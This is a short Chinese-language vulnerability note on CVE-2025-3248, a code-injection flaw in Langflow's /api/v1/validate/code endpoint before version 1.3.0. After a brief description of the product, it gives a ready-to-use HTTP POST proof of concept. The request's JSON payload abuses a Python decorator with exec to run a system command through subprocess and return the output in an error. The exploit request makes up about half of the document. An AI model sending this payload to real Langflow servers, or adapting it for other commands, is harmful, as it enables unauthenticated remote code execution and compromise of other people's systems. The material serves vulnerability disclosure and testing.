# Langflow框架远程命令执行漏洞(CVE-2025-3248)

# 漏洞简介
Langflow是Langflow开源的一个用于构建多代理和 RAG 应用程序的可视化框架。‌是一个面向开发者的低代码工具，专注于多智能体人工智能、提示工程和检索增强生成（RAG）应用的开发。它能够帮助开发者轻松构建强大的AI智能体和工作流，通过可视化方式搭建AI应用，通过拖放操作创建复杂的AI工作流，从而降低开发门槛，减少编写样板代码的工作量，使开发者能够更多地专注于创新‌。Langflow 1.3.0之前版本存在安全漏洞，该漏洞源于/api/v1/validate/code端点存在代码注入漏洞，可能导致远程未经验证的攻击者执行任意代码。

# poc
```javascript
POST /api/v1/validate/code HTTP/1.1
Host: 127.0.0.1
Content-Type: application/jsonContent-Length: 125

{"code": "@exec('raise Exception(__import__(\"subprocess\").check_output([\"id\"]))')\ndef foo():\n  pass"}
```
![image](https://github.com/user-attachments/assets/fb2904cd-a254-4211-9e91-114310540f09)
